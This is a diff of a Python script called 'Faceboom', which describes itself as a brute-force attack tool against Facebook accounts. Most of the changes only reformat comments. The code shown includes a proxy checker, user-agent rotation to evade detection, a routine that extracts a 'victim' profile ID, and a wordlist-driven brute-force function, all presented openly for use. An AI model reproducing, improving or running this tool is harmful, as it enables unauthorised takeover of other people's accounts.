@@ -1,12 +1,15 @@
 #!/usr/bin/python
 # -*- coding: utf-8 -*-
 
-######################
-# SCRIPT NAME: Faceboom ~ v 1.3.0
-# WORKING : Brute Force Attack on Facebook Accounts
-# PROGRAMMER : Hassan Tahir
-######################
-##--------------------- Import Libraries --------------------##
+##################################
+# Program Name: Faceboom ~ v 1.3.0
+# Working : Brute Force Attack on Facebook Accounts
+# Author : Hassan Tahir
+##################################
+
+
+# Imported Libraries
+
 import socket,time,os,optparse,random,re
 try:
   import requests
@@ -20,26 +23,29 @@ except ImportError:
       exit(1) 
 os.system("cls||clear")
 
-## COLORS ###############
+
+# Colors
+
 wi="\033[1;37m" #>>White#
 rd="\033[1;31m" #>Red   #
 gr="\033[1;32m" #>Green #
 yl="\033[1;33m" #>Yallow#
-#########################
 
-################## check internet Connection ######
-def cnet():                                       #
-   try:                                           #
-      ip = socket.gethostbyname("www.google.com") #
-      con = socket.create_connection((ip, 80), 2) #
-      return True                                 #
-   except socket.error:                           #
-         pass                                     #
-   return False                                   #
-                                                  #
-###################################################
 
-#### Check Proxy ####
+# checking internet Connection
+
+def cnet():                                       
+   try:                                           
+      ip = socket.gethostbyname("www.google.com") 
+      con = socket.create_connection((ip, 80), 2) 
+      return True                                 
+   except socket.error:                           
+         pass                                     
+   return False                                   
+                                                  
+
+# Checking Proxy and Ports
+
 def cpro(ip,port=None):
   proxy = '{}:8080'.format(ip) if port ==None else '{}:{}'.format(ip,port)
   proxies = {'https': "https://"+proxy, 'http': "http://"+proxy}
@@ -48,7 +54,10 @@ def cpro(ip,port=None):
     if ip==r.headers['X-Client-IP']: return True
     else : return False
   except Exception : return False
-#### Choice Random User-Agent ####
+
+  
+# Choice Random User-Agent
+
 def useragent():
     useragents = [
            'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.24 (KHTML, like Gecko) RockMelt/0.9.58.494 Chrome/11.0.696.71 Safari/534.24',
@@ -60,7 +69,9 @@ def useragent():
            'Mozilla/5.0 (X11; Linux x86_64; rv:17.0) Gecko/20121202 Firefox/17.0 Iceweasel/17.0.1']
     return random.choice(useragents)
 
-#### Get Target Profile ID ####
+  
+# Fetching Victim Profile ID
+
 def ID(url):
     try:
         idre = re.compile('"entity_id":"([0-9]+)"')
@@ -71,7 +82,9 @@ def ID(url):
         print(rd+"\n["+yl+"!"+rd+"] Error:"+yl+" Please Check Your Victem Profile URL "+rd+"!!!"+wi)
         exit(1)
 
-#### Facebom Brute Force Function ####
+        
+# Faceboom Brute Force Function and Performance
+
 def FBOM(username, wordlist, proxy=None,passwd=None):
     if passwd==None:
       if not os.path.isfile(wordlist):
@@ -119,7 +132,7 @@ def FBOM(username, wordlist, proxy=None,passwd=None):
               useproxy = False
               print(rd+"\n["+yl+"!"+rd+"] Error:"+yl+" Invalid IPv4 ["+rd+str(proxy)+yl+"] "+rd+"!!!"+wi)
               exit(1)
-    else:
+    else: #CLI GUI parameters
       useproxy = False
     prox = gr+useproxy.split(":")[0]+wi+":"+yl+useproxy.split(":")[1] if useproxy !=False else ""
     proxystatus = prox+wi+"["+gr+"ON"+wi+"]" if useproxy !=False else yl+"["+rd+"OFF"+yl+"]"
@@ -279,6 +292,6 @@ def Main():
 
 if __name__=='__main__':
   Main()
-#End of the program
+# End of the program
 
-#This Tool is programmed by Hassan Tahir over MIT Lic
+# This Tool is programmed by Hassan Tahir over MIT Lic
